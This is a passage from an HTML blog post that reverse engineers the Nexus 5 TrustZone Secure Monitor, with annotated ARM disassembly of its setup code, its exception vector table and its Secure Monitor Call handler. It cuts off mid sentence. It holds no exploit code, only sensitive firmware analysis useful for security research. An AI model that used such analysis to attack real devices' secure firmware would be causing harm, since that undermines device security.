&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBDC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear &amp;quot;MMUDCPR&amp;quot; ? &lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;dword_FE82B8CC&lt;/span&gt; &lt;span class="c1"&gt;; load Non-Secure VBAR ptr to R1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBE8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write Non-Secure VBAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBEC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF0&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear Non-Secure VBAR ptr&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear FCSEIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBF8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear CONTEXTIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBFC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRURW&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC00&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRURO&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC04&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;; clear TPIDRPRW&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC08&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_FW OR SCR_AW ; #0x30&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC0C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; switch back to Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC10&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC14&lt;/span&gt;                 &lt;span class="no"&gt;BX&lt;/span&gt;              &lt;span class="no"&gt;LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DC14&lt;/span&gt; &lt;span class="c1"&gt;; End of function sub_FE80DB88&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, the security state is switched to Non-Secure. Then, the
coprocessor registers banked in both security states (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; Banked system control registers) are initialized to zero.
Finally, the security state is switched back to Secure.&lt;/p&gt;
&lt;h5&gt;IV.1.D Setup SP register&lt;/h5&gt;

&lt;p&gt;On ARMv7-A, Multiprocessor Affinity Register (MPIDR) holds the
processor identification information. In this register,
bits&amp;lt;0:7&amp;gt; are the affinity level 0 (Aff0). This number
represents the current CPU id. Here, this id is used to compute the
stack address of current CPU, which is then stored into SP
register. The stack size for each CPU is 0x200 bytes.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB5C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0xFE82B700&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB60&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; write MPIDR value to R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB64&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; keep Affinity level 0 : current virtual CPU id&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB68&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x200&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB6C&lt;/span&gt;                 &lt;span class="no"&gt;MUL&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt; &lt;span class="c1"&gt;; compute stack offset for current vCPU&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB70&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; setup Monitor stack register SP&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.1.E Route FIQ exceptions to Monitor mode&lt;/h5&gt;

&lt;p&gt;CP15 c1 register is present on an ARMv7-A implementation that
includes Security Extensions. This instruction sets bit&amp;lt;2&amp;gt;
(0x4) in Secure Configuration Register (SCR), which means FIQ
exceptions are now taken to Monitor mode.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB74&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0b100 ; SCR.FIQ&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB78&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; set FIQ flag in SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB7C&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; flush the pipeline in the processor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can also notice that bit&amp;lt;0&amp;gt; (SCR.NS : Non-Secure) is not
set, meaning current execution state is Secure.&lt;/p&gt;
&lt;h5&gt;IV.1.F Switch back to Supervisor mode&lt;/h5&gt;

&lt;p&gt;This instruction switches the processor to Supervisor mode, and
sets FIQ &amp;amp; IRQ mask bits.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB80&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MODE_SVC OR CPSR_MASK_FIQ OR CPSR_MASK_IRQ ; switch to Supervisor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Monitor mode setup is now complete. Monitor code can then be
entered through its exception vector table.&lt;/p&gt;
&lt;h3&gt;IV.2. Monitor Exception Vector Table&lt;/h3&gt;

&lt;p&gt;The Monitor exception vector table defines exception vectors to
handle exceptions taken to Monitor Mode.&lt;br&gt;
Its structure is described in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (B1-1167) :&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/nexus5-monitor/ref_vec_table.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;The vector table
entries&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
Thanks to the Monitor initialization code, we know the address of
Nexus 5's Monitor exception vector table:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE0&lt;/span&gt; &lt;span class="no"&gt;monitor_vector_table&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE0&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE4&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE4&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE8&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEE8&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;smc_handler&lt;/span&gt; &lt;span class="c1"&gt;; Secure Monitor Call&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEEC&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEEC&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; Prefetch Abort&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF0&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF0&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; Data Abort&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF4&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF4&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;dead_loop&lt;/span&gt; &lt;span class="c1"&gt;; not used&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF8&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEF8&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;sub_FE80CF24&lt;/span&gt; &lt;span class="c1"&gt;; IRQ interrupt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt;                 &lt;span class="no"&gt;B&lt;/span&gt;               &lt;span class="no"&gt;sub_FE80CFB4&lt;/span&gt; &lt;span class="c1"&gt;; FIQ interrupt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80CEFC&lt;/span&gt; &lt;span class="c1"&gt;; End of function monitor_vector_table&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that 3 exception handlers are configured: SMC, FIQ, IRQ.
Others are dead loops.&lt;/p&gt;
&lt;h3&gt;IV.3. Secure Monitor Call handler function&lt;/h3&gt;

&lt;p&gt;HLOS (non-Secure state) can call the TrustZone API (Secure state)
using the SMC instruction to trigger a Secure Monitor Call
exception. This exception is taken to the Monitor mode, which
switches the processor to Secure Supervisor mode to proceed the
call. When called TrustZone function returns, a second SMC
exception is triggered, so the processor enters Monitor mode again.
Finally, the Monitor mode returns results to the calling function
(Non-Secure state).
The Monitor mode acts as a bridge between Non-Secure state and
Secure state. It's designed to handle calls initiated from the
Non-Secure state only.&lt;/p&gt;
&lt;p&gt;The exception vector dedicated to SMC exceptions is a pointer to a
function at offset 0x08 in Monitor Exception Vector Table.&lt;br&gt;
In this function, which will be named SMC handler, the very first
instruction checks if an exception occurred in Secure or Non-Secure
state (When the processor is in Monitor mode, the processor is in
Secure state regardless of the value of the SCR.NS bit).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;smc_handler&lt;/span&gt; 
&lt;span class="no"&gt;LOAD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;FE80D028&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r0&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0x10&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r1&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0xC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r2&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt; &lt;span class="no"&gt;varg_r3&lt;/span&gt;         &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D028&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D02C&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; read SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D030&lt;/span&gt;                 &lt;span class="no"&gt;TST&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1  ; test SCR.NS bit&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D034&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D210&lt;/span&gt; &lt;span class="c1"&gt;; jump if SCR.NS==0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When an exception is taken to the Monitor mode, CPSR.{A,I, F} bits
are set to 1, meaning Abort, IRQ and FIQ exceptions can no longer
be taken.&lt;/p&gt;
&lt;h3&gt;IV.3.A. Call to Secure World&lt;/h3&gt;

&lt;p&gt;If SCR.NS bit is set, it means the Non-Secure world wants to call
the Secure world. We will now analyze the operations performed by
the SMC handler until the exception return to the Secure world.&lt;br&gt;
&lt;h5&gt;IV.3.A.a Setup current security state&lt;/h5&gt;
This first step configures the Secure Configuration Register (SCR).
Bits&amp;lt;1:3&amp;gt; (SCR.IRQ || SCR.FIQ || SCR.EA) are set to route
IRQ, FIQ, and External Abort exceptions to Monitor mode. But the
Non-Secure bit&amp;lt;0&amp;gt; is not set. So, this core will still be in
the Secure state if it exits Monitor mode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D038&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_IRQ OR SCR_FIQ OR SCR_EA ; 0b1110&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D03C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR with SCR.NS==0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D040&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; Instruction Synchronization Barrier&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D040&lt;/span&gt;                                         &lt;span class="c1"&gt;; flushes the pipeline in the processor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.A.b Monitor calls&lt;/h5&gt;

&lt;p&gt;On a HLOS like Android, SMC exceptions are triggered by the
&lt;a href="https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/scm.c"&gt;
Secure Channel Manager (SCM), implemented in Linux kernel&lt;/a&gt;.&lt;br&gt;
A quick look at its source code tells us {R0-R3} registers hold
arguments of SMC calls. We also learn that R0 is a bitfield that
can be defined by the following macro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SCM_ATOMIC(svc, cmd, n) (((((svc) &amp;lt;&amp;lt; 10)|((cmd) &amp;amp; 0x3ff)) &amp;lt;&amp;lt; 12) | \&lt;/span&gt;
&lt;span class="cp"&gt;    SCM_CLASS_REGISTER | \&lt;/span&gt;
&lt;span class="cp"&gt;    SCM_MASK_IRQS | \&lt;/span&gt;
&lt;span class="cp"&gt;    (n &amp;amp; 0xf))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With svc the service identifier, cmd the command identifier, and n
the argument count of the SMC call.&lt;br&gt;
&lt;br&gt;
In SMC handler, R0 value is first shifted right by 12. Based on the
SCM_ATOMIC macro definition, resulting R0 value represents a
